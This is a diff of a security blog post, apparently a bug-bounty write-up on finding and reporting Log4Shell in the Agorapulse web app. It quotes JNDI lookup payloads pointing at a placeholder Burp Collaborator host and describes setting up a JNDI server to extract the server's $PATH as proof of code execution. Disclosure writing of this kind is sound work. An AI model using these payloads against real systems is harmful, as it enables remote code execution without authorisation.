@@ -23,9 +23,9 @@ Agorapulse basically provides everything an organization could possibly need for
 
 ## How we found log4js on agorapulse:
 
-It was the middle of the winter of 2021 when the news of log4j vulnerability broke out in the cyber security industry. And as the norm goes, it got all the security researchers on their heels. As the clock was ticking, our company decided to focus wholly on exploiting this vulnerability.
+It was the middle of the winter of 2021 when the news of log4j vulnerability broke out in the cyber security community. And as the norm goes, it got all the security researchers on their heels. As the clock was ticking, our company decided to focus wholly on scanning and exploiting this vulnerability on our target infrstructure which include our cleints and few bug-bounty targets.
 
-Our company had many targets to focus on and scan for this vulnerability. So the options were open. One of those available targets was agorapulse. We plunged into research mode and figured out how we were going to scan for this vulnerability. Due to the fact that the vulnerability could be present on any endpoint or any request, it was really hard to focus on one part of an application. So we decided to inject payloads all over the web application and wait for any pingbacks. To do that, we identified features and functionalities where we could use our payloads.
+One of those available targets was agorapulse. We plunged into research mode and brainstormed out how we were going to scan for this vulnerability. Due to the fact that the vulnerability could be present on any endpoint or any request, it was really hard to focus on one part of an application. So we decided to inject payloads all over the web application and wait for any pingbacks. To do that, we identified features and functionalities where we could use our payloads.
 
 As the application was pretty vast with multiple features, we had to stay organized. We used a simple and comprehensive approach of pasting payloads everywhere in the application, and as said above to keep things organized, we used functionality-specific identifiers in the payloads.
 
@@ -34,7 +34,7 @@ For example
 If we were using a payload in the profile-picture field we would use `${jndi:ldap://profilepic.<Your-Burp-Collab-URL>/a}` and if we were pasting a payload in the message box we used `${jndi:ldap://inbox.<Your-Burp-Collab-URL>/a}` and so on, It easily allowed us to identify the vulnerable request to trigger the vulnerability.
 
 
-On the other hand, we also played it safe, using a payload that was not at all harmful to the client i.e did not result in any denial of service attack or executing any malicious commands inside the application. The purpose of the payload was just to give us a pingback so the place of vulnerability could be identified. So we devised the following safe payload to identify the DNS pingbacks : `${jndi:ldap://<Your-Burp-Collab-URL>/a}`.
+On the other hand, we also played it safe, using a payload that was not at all harmful to the client i.e it did not result in any denial of service attack or executing any malicious commands inside the application. The purpose of the payload was just to give us a pingback so the place of vulnerability could be identified. So we devised the following safe payload to identify the DNS pingbacks : `${jndi:ldap://<Your-Burp-Collab-URL>/a}`.
 
 So now the identification process began, and after a while, we received two pingbacks. One of the received was a false positive. But next up, we had a DNS pingback that identified the presence of Log4shell vulnerability.
 
@@ -64,7 +64,7 @@ So, the steps to reproduce were as follows
 ## Demonstration of Impact ( Remote Code Execution )
 
 
-As mentioned in earlier sections, successful exploitation could lead to RCE. We refrained from taking any such action that could lead to any kind of disruption in services. So, we decided to prove the impact by extracting the global PATH variable to prove the real impact of the vulnerability, and we needed to set up a JNDI server for that. So we quickly set up an Amazon EC2 and set up a JNDI server using the following approach.
+As mentioned in earlier sections, successful exploitation could lead to RCE. We refrained from taking any such action that could lead to any kind of disruption in services. So, we decided to extracting the global $PATH variable to prove the real impact of the vulnerability, and we needed to set up a JNDI server for that. So we quickly set up an Amazon EC2 with an hosted an JNDI server using the following approach/commands.
 
 - SSH to your Server
 
@@ -96,7 +96,7 @@ we were able just able to extract the environment variables of the server.
 ![x](/blog/assets/images/agora-log4j/4.png)
   
 
-We stopped right after extracting the path variables of the vulnerable server just to keep the exploitation ethical. Hence, no sensitive, confidential, or any other information related to their users was extracted.
+Just to keep the exploitation ethical, We stopped right after extracting the $PATH environment variable of the agopulse server. Hence, no sensitive, confidential, or any other information related to their users was extracted.
 
 
 ## Response of Agora Team
